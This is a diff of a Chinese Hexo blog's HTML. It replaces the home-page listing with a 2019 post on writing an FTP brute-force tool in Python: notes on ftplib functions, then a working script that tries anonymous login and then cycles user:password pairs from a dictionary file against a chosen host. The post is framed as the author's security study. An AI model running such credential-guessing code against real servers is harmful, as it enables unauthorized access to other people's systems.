@@ -79,13 +79,19 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="D099y">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta name="description" content="要写个ftp爆破的脚本，先学习下ftplib库吧。官方文档:https://docs.python.org/3/library/ftplib.html 部分函数释义import ftplib      # 加载ftp模块ftp = ftplib.FTP()                 # 获取FTP对象ftp.set_debuglevel(2)       # 打开调试级别2，显示详细信息ft">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ftp爆破脚本编写">
+<meta property="og:url" content="http://yoursite.com/2019/01/28/ftp爆破脚本编写/index.html">
 <meta property="og:site_name" content="D099y">
+<meta property="og:description" content="要写个ftp爆破的脚本，先学习下ftplib库吧。官方文档:https://docs.python.org/3/library/ftplib.html 部分函数释义import ftplib      # 加载ftp模块ftp = ftplib.FTP()                 # 获取FTP对象ftp.set_debuglevel(2)       # 打开调试级别2，显示详细信息ft">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/images/pasted-9.png">
+<meta property="og:updated_time" content="2019-02-03T17:58:50.270Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="D099y">
+<meta name="twitter:title" content="ftp爆破脚本编写">
+<meta name="twitter:description" content="要写个ftp爆破的脚本，先学习下ftplib库吧。官方文档:https://docs.python.org/3/library/ftplib.html 部分函数释义import ftplib      # 加载ftp模块ftp = ftplib.FTP()                 # 获取FTP对象ftp.set_debuglevel(2)       # 打开调试级别2，显示详细信息ft">
+<meta name="twitter:image" content="http://yoursite.com/images/pasted-9.png">
 
 
 
@@ -115,13 +121,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/">
+  <link rel="canonical" href="http://yoursite.com/2019/01/28/ftp爆破脚本编写/">
 
 
 
 
 
-  <title>D099y</title>
+  <title>ftp爆破脚本编写 | D099y</title>
   
 
 
@@ -140,8 +146,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
@@ -244,9 +249,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -276,9 +281,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/01/28/ftp爆破脚本编写/" itemprop="url">ftp爆破脚本编写</a></h1>
+          <h1 class="post-title" itemprop="name headline">ftp爆破脚本编写</h1>
         
 
         <div class="post-meta">
@@ -328,19 +331,14 @@
       
 
       
-        
-          
-          要写个ftp爆破的脚本，先学习下ftplib库吧。官方文档:https://docs.python.org/3/library/ftplib.html
-部分函数释义import ftplib      # 加载ftp模块ftp = ftplib.FTP()                 # 获取F
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/01/28/ftp爆破脚本编写/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
+        <p>要写个ftp爆破的脚本，先学习下ftplib库吧。<br>官方文档:<a href="https://docs.python.org/3/library/ftplib.html" target="_blank" rel="noopener">https://docs.python.org/3/library/ftplib.html</a></p>
+<p>部分函数释义<br>import ftplib      # 加载ftp模块<br>ftp = ftplib.FTP()                 # 获取FTP对象<br>ftp.set_debuglevel(2)       # 打开调试级别2，显示详细信息<br>ftp.connect(‘IP’, PORT) # 连接ftp，server和端口<br>ftp.login(‘user’, ‘password’)  # 登录用户<br>print(ftp.getwelcome())     # 打印欢迎信息<br>ftp.cmd(‘xxx/xxx’)          # 进入远程目录<br>bufsize = 1024              # 设置缓存区大小<br>filename=’filename.txt’     # 需要下载的文件<br>file_handle=open(filename, ‘wb’).write   # 以写的模式在本地打开文件<br>file.retrbinaly(‘RETR filename.txt’, file_handle,bufsize)  # 接收服务器上文件并写入本地文件<br>ftp.set_debuglevel(0)       # 关闭调试模式<br>ftp.quit                    # 退出ftp</p>
+<p>ftp相关的命令操作<br>ftp.cwd(pathname)           # 设置FTP当前操作的路径<br>ftp.dir()                   # 显示目录下所有目录的信息<br>ftp.nlst()                  # 获取目录下的文件<br>ftp.mkd(pathname)           # 新建远程目录<br>ftp.rmd(dirname)            # 删除远程目录<br>ftp.pwd()                   # 返回当前所在位置<br>ftp.delete(filename)        # 删除远程文件<br>ftp.rename(fromname, toname)    #将fromname改为toname<br>ftp.storbinaly(‘STOR filename.txt’,file_handel,bufsize)  # 上传目标文件<br>ftp.retrbinary(‘RETR filename.txt’,file_handel,bufsize)  # 下载FTP文件</p>
+<p>暂时写了个尚未完善的单线程爆破脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import ftplib</span><br><span class="line"></span><br><span class="line">def usage():</span><br><span class="line">    print(&apos;python  ftp爆破工具&apos;)</span><br><span class="line">def anonLogin(host):</span><br><span class="line">    try:</span><br><span class="line">        ftp=ftplib.FTP()</span><br><span class="line">        ftp.connect(host,port)</span><br><span class="line">        ftp.login()</span><br><span class="line">        ftp.retrlines(&apos;LIST&apos;)</span><br><span class="line">        print(ftp.getwelcome())</span><br><span class="line">        print(&apos;\n&apos;+host+&apos; FTP Anonymous Login Succeeded!&apos;)</span><br><span class="line">        ftp.quit()</span><br><span class="line">        return True</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&apos;\n&apos;+str(host)+&apos; FTP Anonymous Login Failed!&apos;)</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def bruteftp(host,file,port):</span><br><span class="line">    f=open(file,&apos;r&apos;)</span><br><span class="line">    lines=f.readlines()</span><br><span class="line">    for line in lines:</span><br><span class="line">        user=line.split(&quot;,&quot;)[0]</span><br><span class="line">        passwd=line.split(&quot;,&quot;)[1].strip(&quot;\n&quot;)</span><br><span class="line">        print(&apos;Trying: &apos;+user+&apos;:&apos;+passwd)</span><br><span class="line">        try:</span><br><span class="line">            ftp=ftplib.FTP()</span><br><span class="line">            ftp.connect(host,port)</span><br><span class="line">            ftp.login(user,passwd)</span><br><span class="line">            ftp.retrlines(&apos;LIST&apos;)</span><br><span class="line">            print(ftp.getwelcome())</span><br><span class="line">            print(&apos;\n&apos;+host +&apos;Succeeded!&apos;)</span><br><span class="line">            ftp.quit()</span><br><span class="line">            return(user,passwd)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            pass</span><br><span class="line">    print(&apos;\n[-] Could not brute force FTP!&apos;)</span><br><span class="line">    return(None,None)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    usage()</span><br><span class="line">    host = input(&quot;请输入ftp地址:&quot;)</span><br><span class="line">    port = int(input(&quot;请输入端口号:&quot;))</span><br><span class="line">    if anonLogin(host):</span><br><span class="line">        pass</span><br><span class="line">    else:</span><br><span class="line">        a=bruteftp(host,&quot;dict.txt&quot;,port)</span><br><span class="line">        print(&quot;User：%s Password：%s&quot;%a)</span><br></pre></td></tr></table></figure>
+<p>运行截图:</p>
+<p><img src="/images/pasted-9.png" alt="upload successful"></p>
+
       
     </div>
     
@@ -357,139 +355,28 @@
       
 
       
-
-      
-
       
       
-        <div class="post-eof"></div>
+
       
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/23/sqli-labs平台学习/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Gu">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="D099y">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/01/23/sqli-labs平台学习/" itemprop="url">sqli-labs平台学习</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
             
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-23T14:23:21+08:00">
-                2019-01-23
-              </time>
+              <a href="/2019/01/23/sqli-labs平台学习/" rel="next" title="sqli-labs平台学习">
+                <i class="fa fa-chevron-left"></i> sqli-labs平台学习
+              </a>
             
+          </div>
 
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
             
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-          Less-1http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-1/?id=1&#39;--+
-http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-1/?id=-1&#39
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/01/23/sqli-labs平台学习/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -499,264 +386,11 @@ http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-1/?id=-1&#39
   </article>
 
 
-    
-      
 
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/23/hexo一些用法/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Gu">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="D099y">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/01/23/hexo一些用法/" itemprop="url">hexo一些用法</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-23T11:13:00+08:00">
-                2019-01-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          常见命令hexo new “postName” #新建文章hexo new page “pageName” #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，’ctrl + c’关闭server）hexo deploy
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/01/23/hexo一些用法/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
+    <div class="post-spread">
       
     </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
   </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/23/第一篇文章/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Gu">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="D099y">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/01/23/第一篇文章/" itemprop="url">创建博客初衷</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-23T10:59:10+08:00">
-                2019-01-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          一直都想有个自己的博客，看了Doggy师傅还有孙老师这些大佬的博客，都是用hexo搭，自己也搭一个吧。博客就用来记录自己做题、渗透和学习的记录吧。接触安全半年多，和Doggy师傅的差距还是很大，弄个博客督促自己学习吧。2019年准备挖挖补天，刷刷src，加油吧。
-
-
-          
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/01/23/第一篇文章/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-  </section>
-
-  
 
 
           </div>
@@ -764,6 +398,10 @@ http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-1/?id=-1&#39
 
 
           
+
+  
+
+
 
         </div>
         
@@ -967,6 +605,10 @@ http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/Less-1/?id=-1&#39
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
